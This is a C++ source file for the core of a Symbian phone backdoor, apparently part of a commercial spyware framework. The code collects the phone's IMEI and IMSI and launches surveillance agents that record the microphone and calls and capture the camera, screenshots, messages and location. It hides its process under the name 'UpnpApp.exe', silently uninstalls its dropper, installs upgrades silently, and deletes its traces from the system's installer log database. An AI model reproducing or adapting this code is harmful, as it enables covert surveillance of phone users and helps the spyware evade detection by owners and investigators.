
//  Include Files  
#include <e32base.h>
#include <e32std.h>
#include <bautils.h>
#include <coemain.h>
#include <swi/sisregistrysession.h>
#include <swi/sisregistryentry.h>
#include <swinstapi.h>			// installer
#include <swinstdefs.h>
#include "Core.h"
#include "ConfigFile.h"
#include "ActionEvent.h"
#include "ActionAgent.h"


#include <D32DBMS.h> 

#include <HT\FileUtils.h>
#include <HT\AES.h>
#include <HT\Processes.h>
#include <HT\EventFactory.h>
#include <HT\AgentFactory.h>
#include <HT\ActionFactory.h>
#include <HT\AbstractEvent.h>
#include <HT\AbstractAgent.h>
#include <HT\AbstractAction.h>


//Demo key
#ifdef _DEBUG
//_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmJO");
_LIT8(KDEMO_KEY,"Pg-WaVyPzMMMMmGbhP6qAiJO");  // since 8.1.4
#else
//_LIT8(KDEMO_KEY,"hxVtdxJ/Z8LvK3ULSnKRUmLE");
_LIT8(KDEMO_KEY,"Pg-WaVyPzMMMMmGbhP6qAigT");  // since 8.1.4
#endif
//CCITT CRC (16 bits, polynomial 0x1021 and initial value 0xffff) of "hxVtdxJ/Z8LvK3ULSnKRUmLE"
//const TUint16 KCrcDemoKey=0xbd80; 
//CCITT CRC (16 bits, polynomial 0x1021 and initial value 0xffff) of "Pg-WaVyPzMMMMmGbhP6qAigT"
const TUint16 KCrcDemoKey=0x1a1a;   // since 8.1.4 

TBuf<50>  iGlobalImei;
TBuf<15>  iGlobalImsi;
TBuf8<16>  iSymbianSubtype;

CCore::CCore() :
	CAbstractQueueEndPoint(ECore,0)
	{
	}

CCore* CCore::NewLC()
	{
	CCore* self = new (ELeave) CCore();
	CleanupStack::PushL(self);
	self->ConstructL();
	return self;
	}

CCore::~CCore()
	{
	__FLOG(_L("Destructor"));
	iEvents.ResetAndDestroy();
	iEvents.Close();
	iEndPoints.ResetAndDestroy();
	iEndPoints.Close();
	delete iConfig;
	delete iFreeSpaceMonitor;
	
	if(iDemoVersion)
		{
		delete iTonePlayer;
		}
	
	iFs.Close();
	RProperty::Delete(KPropertyUidCore,KPropertyFreeSpaceThreshold);
	RProperty::Delete(KPropertyUidCore,KPropertyStopSubactions);
	RProperty::Delete(KPropertyUidCore,KPropertyCrisis);
	
	__FLOG(_L("EndDestructor"));
	__FLOG_CLOSE;
	}

void CCore::ConstructL()
	{
	BaseConstructL();
	__FLOG_OPEN("HT", "Core.txt");
	__FLOG(_L("------------"));

	static _LIT_SECURITY_POLICY_PASS(KAllowAllPolicy);
	TInt ris = 0;
	ris = RProperty::Define(KPropertyUidCore, KPropertyFreeSpaceThreshold, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);
	ris = RProperty::Define(KPropertyUidCore, KPropertyStopSubactions, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);	
	ris = RProperty::Define(KPropertyUidCore, KPropertyCrisis, RProperty::EInt,KAllowAllPolicy, KAllowAllPolicy);	
	RProperty::Set(KPropertyUidCore, KPropertyStopSubactions,0);
	RProperty::Set(KPropertyUidCore, KPropertyCrisis,0);
	
	iConfig = CConfigFile::NewL();
	iFs.Connect();
	iFreeSpaceMonitor = CFreeSpaceMonitor::NewL(*this,iFs);
	
	TUint16 crc=0;
	Mem::Crc(crc,KDEMO_KEY().Ptr(),KDEMO_KEY().Length());
	if(crc == KCrcDemoKey)
		{
		iDemoVersion = ETrue;
		iSymbianSubtype.Copy(_L8("SYMBIAN-DEMO"));
		}
	else
		{
		iDemoVersion = EFalse;
		iSymbianSubtype.Copy(_L8("SYMBIAN")); 
		}
	
	if(iDemoVersion)
		{
		iTonePlayer = CTonePlayer::NewL();
		}
		
	CPhone* phone = CPhone::NewLC(); 
	phone->GetImeiSync(iGlobalImei);
	phone->GetImsiSync(iGlobalImsi);
	CleanupStack::PopAndDestroy();
	
	__FLOG(_L("End ConstructL"));
	}


void CCore::DisposeAgentsAndActionsL()
	{
	int i = 0;
	// Deletes the executed Actions and the stopped Agents...
	while (i < iEndPoints.Count())
		{
		if (((iEndPoints[i]->Type() >= EAction) && (iEndPoints[i]->Type() <= EAction_LAST_ID)) && iEndPoints[i]->FinishedJob())
					{
					delete iEndPoints[i];
					iEndPoints.Remove(i);
					continue;
					}
				
		if (!iEndPoints[i]->CanReceiveCmd() && (iEndPoints[i]->Type()) >= EAgent && (iEndPoints[i]->Type() <= EAgent_LAST_ID))
			{
			delete iEndPoints[i];
			iEndPoints.Remove(i);
			continue;
			}
		i++;
		}	
	}

/*
void CCore::RestartAllAgentsL()  
	{
	// Stops all the running Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Running)
			{
			TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
			SubmitNewCommandL(ESecondaryQueue,restartCmd);
			}
		}
	}
*/

void CCore::CycleAppendingAgentsL()
	{
	// Stops the running Agents that creates logs in append
	// so excluding: AgentMic, AgentScreenshot, AgentCallLocal, AgentCamera, AgentMessages...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Running)
			{
			switch(dataAgent->iId)
				{
				case EAgent_Mic:
				case EAgent_Screenshot:
				case EAgent_CallLocal:
				case EAgent_Cam:
				case EAgent_Device:
				case EAgent_Messages:
					break;
				default:
					{
					//TCmdStruct restartCmd(ERestart, ECore, dataAgent->iId);
					TCmdStruct cycleCmd(ECycle, ECore, dataAgent->iId);
					SubmitNewCommandL(EPrimaryQueue,cycleCmd);
					}
					break;
				}
			}
		}
	}


void CCore::StopAllAgentsAndEventsL()
	{
	// Stops all the running Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		StopAgentL(dataAgent->iId);
		}

	// Disposes all the Events...
	TInt i = 0;
	while(i < iEvents.Count())
		{
		delete iEvents[i];
		iEvents.Remove(i); 
		i++;
		}
	}


void CCore::LoadConfigAndStartL()
	{
	__FLOG(_L("LoadConfigAndStartL() enter"));
	
	StopAllAgentsAndEventsL(); 
	
	// Read the updated Configuration
	RFs fs;
	User::LeaveIfError(fs.Connect());
	CleanupClosePushL(fs);

	TFullName tmpConfigFile; tmpConfigFile.Copy( KTMP_CONFNAME );
	TFullName configFile; configFile.Copy( KCONFNAME );
	FileUtils::CompleteWithPrivatePathL(fs, tmpConfigFile);
	FileUtils::CompleteWithPrivatePathL(fs, configFile);	
	
	// Try to load the new config file first...
	TBool validConfig = iConfig->LoadL(fs, tmpConfigFile);
	if (validConfig)
		{
		//write LogInfo
		_LIT(KValidNewConf,"New configuration activated");
		LogInfoMsgL(KValidNewConf);
		
		BaflUtils::CopyFile(fs, tmpConfigFile, configFile);
		} else
		{
		validConfig = iConfig->LoadL(fs, configFile);
		}
	fs.Delete(tmpConfigFile);
	
	CleanupStack::PopAndDestroy(&fs);
	__FLOG_1(_L("Loaded Config: %d"), validConfig);

	// Starts all the Agents...
	for (int i = 0; i < iConfig->iAgentsList.Count(); i++)
		{
		CDataAgent* dataAgent = iConfig->iAgentsList[i];
		if (dataAgent->iStatus == EAgent_Enabled)
			{
			StartAgentL(dataAgent->iId);
			}
		}

	// Starts all the Events...
	for (int i = 0; i < iConfig->iEventsList.Count(); i++)
		{
		CDataEvent* dataEvent = iConfig->iEventsList[i];
		CAbstractEvent* newEvent = EventFactory::CreateEventL(dataEvent->iId, dataEvent->iParams,
				dataEvent->iMacroActionIdx);
		iEvents.Append(newEvent);
		}
	__FLOG(_L("LoadConfigAndStartL() exit"));
	}

void CCore::LoadNewConfigL()
	{
		// log new config received
		_LIT(KNewConf,"New configuration received");
		LogInfoMsgL(KNewConf);
		
		// clear events
		iEvents.ResetAndDestroy();
		// clear iEndPoints
		iEndPoints.ResetAndDestroy();
		
		// mark agents as stopped
		TInt count = iConfig->iAgentsList.Count();
		for (int i = 0; i < count; i++)
		{
			iConfig->iAgentsList[i]->iStatus = EAgent_Stopped;
		}
		// empty the shared queue	
		DoEmptyQueueL();
		// restart
		LoadConfigAndStartL();
		
	}

void CCore::LoadNewUpgradeL()
	{
	// 1. install uninstaller
	// Prepare for silent install
	SwiUI::RSWInstSilentLauncher      launcher; 
	SwiUI::TInstallOptions            options;
	SwiUI::TInstallOptionsPckg        optionsPckg;	
		
	// Connect to the server
	User::LeaveIfError( launcher.Connect() );
	  
	// See SWInstDefs.h for more info about these options
	options.iUpgrade = SwiUI::EPolicyAllowed;
	options.iOCSP = SwiUI::EPolicyNotAllowed;
	options.iDrive = 'C';   // Hard-coded as phone memory  
	options.iUntrusted = SwiUI::EPolicyNotAllowed; 
	options.iCapabilities = SwiUI::EPolicyAllowed;
		    
	optionsPckg = options;
		
	// Create path
	TBuf<48> path;
	path.Append(_L("C:\\Private\\"));
	TBuf<12> uid;
	uid.Copy(KUidCore);
	uid.Copy(uid.Mid(2,uid.Length()-2));
	path.Append(uid);
	path.Append(_L("\\Uninstaller.sisx"));
		
	// Start synchronous install
	TInt err = launcher.SilentInstall(path,optionsPckg);
			
	launcher.Close();
	// 2. call it with a parameter so it is instructed to act as upgrader and not uninstaller
	// retrieve uid3 of uninstaller
	TBuf8<12> hexBuf(KUidUninstaller);
	hexBuf.Copy(hexBuf.Mid(2,hexBuf.Length()-2));
	TLex8 lex(hexBuf);
	TUint32 bdUid;
	lex.Val(bdUid,EHex);
	TUid kUid3 = TUid::Uid(bdUid);
	// construct TUidType
	TUidType uidType(TUid::Uid(0x1000007a), TUid::Uid(0x0), kUid3 );
	// create process with that uid, so we are sure it's not another with the same name
	RProcess process;
	process.Create(_L("Uninstaller.exe"),_L("fake_param"), uidType);
	process.Resume();
	process.Close();
	}

void CCore::StartAgentL(TAgentType aAgentId)
	{
	if(aAgentId == 0)
		return;
	// MARK: Begin AGENT_CALL Patch
	if (aAgentId == EAgent_Call_TODO)
		{
		StartAgentL(EAgent_CallLocal);
		StartAgentL(EAgent_CallList);
		return;
		}
	// End AGENT_CALL Patch

	// Retrieves the Agent's Parameters from the Config
	CDataAgent* dataAgent = iConfig->FindDataAgent(aAgentId);

	// Raises a PANIC if the Agent is not available in the Config.
	//ASSERT(dataAgent != NULL); 
	if(dataAgent == NULL)
		return;
	// We have to distinguish between continuous modules and one shot modules
	switch (aAgentId)
		{
		case EAgent_Cam:
		case EAgent_Device:
		case EAgent_Screenshot:
		case EAgent_Position:	
			{
			// one shot modules: create them at first start command, then they lives forever or 
			// until new conf; we always send a START command, it will be responsibility
			// of the module to ignore command if already busy with a previous START
			if(dataAgent->iStatus != EAgent_Running)
				{
				// Creates the new Agent 
				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(aAgentId, dataAgent->iParams);
				TInt err = iEndPoints.Append(newAgent);
				// Mark this Agent as "Running" so it will be stopped when a new config will be uploaded
				dataAgent->iStatus = EAgent_Running;	
				}
			// send it the START command
			TCmdStruct startCmd(EStart, ECore, aAgentId);
			SubmitNewCommandL(ESecondaryQueue, startCmd);
			}
			break;
		default:
			{
			// continuous modules
			if(dataAgent->iStatus != EAgent_Running)
				{
				if((aAgentId == EAgent_CallLocal) && (dataAgent->iAdditionalData == 0))
						return; //we are not asked to start call recording
				// Creates the new Agent and send it the START command.
				CAbstractAgent* newAgent = AgentFactory::CreateAgentL(aAgentId, dataAgent->iParams);
				TInt err = iEndPoints.Append(newAgent);
				TCmdStruct startCmd(EStart, ECore, aAgentId);
				SubmitNewCommandL(ESecondaryQueue,startCmd);

				// Mark this Agent as "Running" so it will be stopped when a new config will be uploaded
				dataAgent->iStatus = EAgent_Running;	
				}
			}
			break;
		}
	}


void CCore::StopAgentL(TAgentType aAgentId)
	{
	if(aAgentId == 0)
		return;
	// MARK: Begin AGENT_CALL Patch
	if (aAgentId == EAgent_Call_TODO)
		{
		StopAgentL(EAgent_CallLocal);
		StopAgentL(EAgent_CallList);
		return;
		} 
	// End AGENT_CALL Patch
		
	// Retrieves the Agent's Parameters from the Config
	CDataAgent* dataAgent = iConfig->FindDataAgent(aAgentId);

	// Raises a PANIC if the Agent is not available in the Config.
	//ASSERT(dataAgent != NULL);
	if (dataAgent == NULL)
		return;

	// If the Agent is already Stopped, do nothing.
	if (dataAgent->iStatus == EAgent_Stopped)
		return;

	// Sends a Stop command to the Agent
	TCmdStruct stopCmd(ECmdStop, ECore, aAgentId);
	SubmitNewCommandL(ESecondaryQueue, stopCmd);

	// Mark this Agent as "Stopped"
	dataAgent->iStatus = EAgent_Stopped;	
	}

void CCore::EnableEventL(TInt aEventIdx)
	{
	TInt count = iEvents.Count();
	if((aEventIdx >= count) || (aEventIdx < 0))
		return; //out of boundary
	if(!iEvents[aEventIdx]->Enabled())
		iEvents[aEventIdx]->StartEventL();
	}


void CCore::DisableEventL(TInt aEventIdx)
	{
	TInt count = iEvents.Count();
	if(aEventIdx >= count)
		return; //out of boundary
	if(iEvents[aEventIdx]->Enabled())
		iEvents[aEventIdx]->StopEventL();
	}

void CCore::ExecuteActionL(TInt aQueueId,CDataAction* aDataAction)
	{
	TActionType type = aDataAction->iId;
	
	__FLOG_1(_L("ExecuteAction: %d"), type);
	
	if (type == EAction_Sync || type == EAction_SyncApn)
		{
		CycleAppendingAgentsL();
		}
	
	// Creates the Action and send it a Start
	CAbstractAction* newAction = ActionFactory::CreateActionL(type, aDataAction->iParams, (TQueueType) aQueueId);
	newAction->iTag = aDataAction->iTagId;
	if(type == EAction_Event)
		{
		CActionEvent* actionEvent = (CActionEvent*)newAction;
		actionEvent->SetCorePointer(this);
		}
	if(type == EAction_Agent)
		{
		CActionAgent* actionAgent = (CActionAgent*)newAction;
		actionAgent->SetCorePointer(this);
		}
	newAction->iConditioned = aDataAction->iConditioned;
	iEndPoints.Append(newAction);
	TCmdStruct startCmd(EStart, ECore, type, newAction->iTag);
	SubmitNewCommandL(aQueueId,startCmd);
	__FLOG(_L("ActionsExecuted"));
	}

void CCore::DispatchCommandL(TCmdStruct aCommand)
	{
	ASSERT( aCommand.iType == ENotify );

	if(iDemoVersion)
		{
		iTonePlayer->Play();
		}
	
	// This is an "Event Triggered" Notification...
	// Gets the id of the macro action to execute...
	TInt macroIdx = aCommand.iSrc;

	ASSERT( macroIdx < iConfig->iMacroActionsList.Count() );

	// Gets the MacroAction to execute.
	CDataMacroAction* macroAction = iConfig->iMacroActionsList[macroIdx];

	// Gets the queue id
	TInt queueId = macroAction->iQueueId;
	
	// Enqueue all the actions
	for (int i = 0; i < macroAction->iActionsList.Count(); i++)
		{
		CDataAction* action = macroAction->iActionsList[i];

		ExecuteActionL(queueId,action);
		}

	// This command has been dispatched.
	MarkCommandAsDispatchedL();
	
	// Resources Cleanup... It is not mandatory, it just deletes the executed Actions and the stopped Agents.
	DisposeAgentsAndActionsL();
	}

/**
 * Called by the Framework when the Shared Queue has been updated
 */
void CCore::PropertyChangedL(TUid category, TUint key, TInt value)
	{
	
		// Load a new configuration, triggered into ActionSync.cpp
		if (value == 0xEFBE){
			LoadNewConfigL();
			return;
		}
		
		// Load a new upgrade, triggered into ActionSync.cpp
		if (value == 0xEADE){
			LoadNewUpgradeL();
			return;
		}
				
		CAbstractQueueEndPoint::PropertyChangedL(category, key, value);

		//TODO: delete when done with memory leak tests
		/*
#ifdef _DEBUG
	if (value == 0xDEAD)
		{
		CActiveScheduler::Stop();
		return;
		}
#endif
*/
	}


void CCore::LogInfoMsgL(const TDesC& aLogMessage)
	{
	CBufBase* buffer = CBufFlat::NewL(50);
	CleanupStack::PushL(buffer);
	buffer->InsertL(buffer->Size(),(TUint8*)aLogMessage.Ptr(),aLogMessage.Size());
	HBufC8* byteBuf = buffer->Ptr(0).AllocLC();
	CLogFile* logFile = CLogFile::NewLC(iFs);
	logFile->CreateLogL(LOGTYPE_INFO);
	logFile->AppendLogL(*byteBuf);
	logFile->CloseLogL();
	CleanupStack::PopAndDestroy(logFile);
	CleanupStack::PopAndDestroy(byteBuf);
	CleanupStack::PopAndDestroy(buffer);
	}

void CCore::WriteInstallTimeMarkupL()
	{
	CLogFile* markupFile = CLogFile::NewLC(iFs);
	if(!markupFile->ExistsMarkupL(EEvent_AfterInstall))
		{
		//this is the first installation, write install time
		TTime now;
		now.UniversalTime();
		
		TInt64 timestamp = now.Int64();
		CBufBase* buffer = CBufFlat::NewL(50);
		CleanupStack::PushL(buffer);
			
		TUint32 len = sizeof(len) + sizeof(timestamp);
		buffer->InsertL(buffer->Size(), &len, sizeof(len));
		buffer->InsertL(buffer->Size(), &timestamp, sizeof(timestamp));

		HBufC8* result = buffer->Ptr(0).AllocL();
		CleanupStack::PopAndDestroy(buffer);
		markupFile->WriteMarkupL(EEvent_AfterInstall,*result);
		delete result;
		}
	//else do nothing
	CleanupStack::PopAndDestroy(markupFile);
	}


void CCore::StartMonitorFreeSpace()
	{
	TBool below = iFreeSpaceMonitor->IsBelowThreshold();
	if(below)
		{
		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
		}
	else
		{
		RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
		}
	iFreeSpaceMonitor->StartListeningForEvents();
	}


void CCore::NotifyAboveThreshold()
	{
	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 1);
	}

void CCore::NotifyBelowThreshold()
	{
	RProperty::Set(KPropertyUidCore, KPropertyFreeSpaceThreshold, 0);
	}

TBool CCore::DemoVersion()
	{
	return iDemoVersion;
	}

LOCAL_C void DeleteInstallerLog(TUid aUid)
	{
	// install log table has been defined into Symbian source code as:
	/*
	// SQL query used to create the log table
	_LIT( KLogCreateTableSQL, 
	"CREATE TABLE log (time BIGINT NOT NULL,uid UNSIGNED INTEGER NOT NULL,\
	name VARCHAR(128) NOT NULL,vendor VARCHAR(128) NOT NULL,\
	version VARCHAR(16) NOT NULL,action UNSIGNED INTEGER,startup UNSIGNED INTEGER)" );
	*/

	_LIT( KLogSecureFormat, "SECURE%S" );   // found  in LogTask.cpp
	#define KSWInstLogAccessPolicyUid 0x10207216  // found in SWInstUid.h
	// UID of the SWInstLog db access policy, found in SWInstLogTaskParam.h
	const TUid KLogAccessPolicyUid = { KSWInstLogAccessPolicyUid }; 
	// Name of the install log db, found in SWInstLogTaskParam.h 
	_LIT( KLogDatabaseName, "c:SWInstLog.db" );  
	// Name of the log table, found in SWInstLogTaskParam.h
	_LIT( KLogTableName, "log" );

	TInt err;
	RDbs dbSession;
	err = dbSession.Connect();
	if(err != KErrNone)
		return;
	CleanupClosePushL(dbSession);
	// Construct the db format string
	TBuf<32> formatString;
	TUidName uidStr = KLogAccessPolicyUid.Name();    
	formatString.Format( KLogSecureFormat, &uidStr );
		
	RDbNamedDatabase dbs;
	// Try to open the db
	err = dbs.Open( dbSession, KLogDatabaseName, formatString );
	if(err != KErrNone)
		{
		// can't open db, return
		CleanupStack::PopAndDestroy(&dbSession);
		return;
		}
	CleanupClosePushL( dbs );
					
	// See if the log table already exists
	RDbTable table;
	err = table.Open( dbs, KLogTableName);
	if ( err != KErrNone )
		{
		// Table does not exist
		CleanupStack::PopAndDestroy(2); //dbs, dbsession
		return;
		}
	CleanupClosePushL( table );        
	
	// delete entry
	_LIT( KLogDeleteSQLFormat,"DELETE FROM log WHERE uid=%u"); 
	TBuf<64> sqlString;
	sqlString.Format(KLogDeleteSQLFormat,aUid.iUid);
	dbs.Execute(sqlString);
	dbs.Compact();
	CleanupStack::PopAndDestroy(3); //table, dbs, dbsession       
	}



LOCAL_C void DoStartL()
	{
	// rename the process
	_LIT(KProcName, "UpnpApp.exe");
	if (!Processes::RenameIfNotRunning(KProcName))
		return;

	User::After(10*1000000);

	//delete bd installation log entry
	TUid uid = GetUid(KUidBackdoor);
	DeleteInstallerLog(uid);
	
	// uninstall dropper
	Swi::RSisRegistrySession sisRegSession;
	sisRegSession.Connect(); 
	uid = GetUid(KUidUninstaller);
	Swi::RSisRegistryEntry packageEntry;
	if(KErrNone == packageEntry.Open(sisRegSession,uid))
		{
		// dropper is installed
		// uninstall dropper
		SwiUI::TUninstallOptions iOptions;
		SwiUI::TUninstallOptionsPckg iOptionsPckg; 
		iOptions.iKillApp=SwiUI::EPolicyAllowed;
		iOptionsPckg = iOptions;
		SwiUI::RSWInstLauncher launcher ;
		TInt err = launcher.Connect();
		if(err == KErrNone)
			{
			// Synchronous silent uninstall
			err=launcher.SilentUninstall(uid, iOptionsPckg,SwiUI::KSisxMimeType) ;
			}
		launcher.Close();
		//delete dropper uninstallation log
		uid = GetUid(KUidUninstaller);
		DeleteInstallerLog(uid);
		}
	sisRegSession.Close();
		
	// Create active scheduler (to run active objects)
	CActiveScheduler* scheduler = new (ELeave) CActiveScheduler();
	CleanupStack::PushL(scheduler);
	CActiveScheduler::Install(scheduler);
	
	CCore* core = CCore::NewLC();
	
	//log backdoor start
	_LIT(KBdStart,"Start");
	core->LogInfoMsgL(KBdStart);
	
	//markup install time
	core->WriteInstallTimeMarkupL();
	
	//load config
	core->LoadConfigAndStartL();
	
	//start free space monitor
	core->StartMonitorFreeSpace();  
	
	CActiveScheduler::Start(); 
			
	CleanupStack::PopAndDestroy(core);
	// Delete active scheduler
	CleanupStack::PopAndDestroy(scheduler); 
	}

//  Global Function
GLDEF_C TInt E32Main()
	{
	// Create cleanup stack
	__UHEAP_MARK;
	CTrapCleanup* cleanup = CTrapCleanup::New();
	// Run application code inside TRAP harness
	TRAPD(mainError, DoStartL());

	delete cleanup;
	__UHEAP_MARKEND;
	//return KErrNone;
	return mainError;   // as suggested by Marco
	}
